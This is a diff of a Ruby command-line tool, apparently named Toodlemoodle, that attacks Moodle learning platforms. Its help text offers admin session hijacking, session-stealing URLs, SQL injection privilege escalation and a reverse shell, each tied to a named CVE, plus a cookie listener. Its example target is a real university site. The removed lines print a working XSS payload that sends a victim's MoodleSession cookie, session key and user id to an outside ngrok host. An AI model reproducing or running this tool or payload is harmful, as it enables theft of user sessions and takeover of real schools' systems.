@@ -21,12 +21,11 @@ module Toodlemoodle
       OptionParser.parse! do |parser|
         parser.banner = "Usage: tmoodle command [arguments]\n" \
                         "Commands:\nscan -- Scans the target, revealing the version and vulnerabilities.\n" \
-                        "helper -- Prints a JavaScript to help extract your Moodle Session ID, Session Key, and User ID.\n" \
+                        "helper -- Extracts your Moodle Session ID and Session Key.\n" \
                         "dashboard_xss -- Inserts a session stealer on to your dashboard for the Admin hijack CVE-2019-3847.\n" \
                         "assignment_xss -- Specially crafted URLs to steal sessions using CVE-2017-2578.\n" \
                         "sql_injection -- Exploits CVE-2017-2641 to escalate a user's privelege.\n" \
                         "rce_shell -- Exploits CVE-2018-1133 (must be a teacher) to launch a reverse shell.\n" \
-                        "session -- Retrives the session information.\n" \
                         "listen -- Listen for cookies\n"
         parser.separator("\nArguments:")
         parser.on("-t TARGET", "--target=TARGET", "Moodle target to attack. Do not include a slash at the end! Example: https://ole.unibz.it ") do |str|
@@ -56,9 +55,8 @@ module Toodlemoodle
         scanner = Scanner.new
         scanner.perform(@target)
       when "helper"
-        puts "Copy and paste this into your DevTools console on an OLE page to extract your own session, session key, and user id.\n\nalert('MoodleSession: ' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '\\nSessKey: ' + M.cfg.sesskey + '\\nUser id: ' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid'))\n\n"
-        puts "An example session stealer: \n" \
-             "<script>document.write('<img src=\"https://5fc418e2.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '&sesskey=' + M.cfg.sesskey + '&id=' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid') + '\" />')</script>"
+        session_info = SessionInfo.new
+        session_info.perform(@target)
       when "dashboard_xss"
         target_required()
         dashboard_xss = DashboardXSS.new
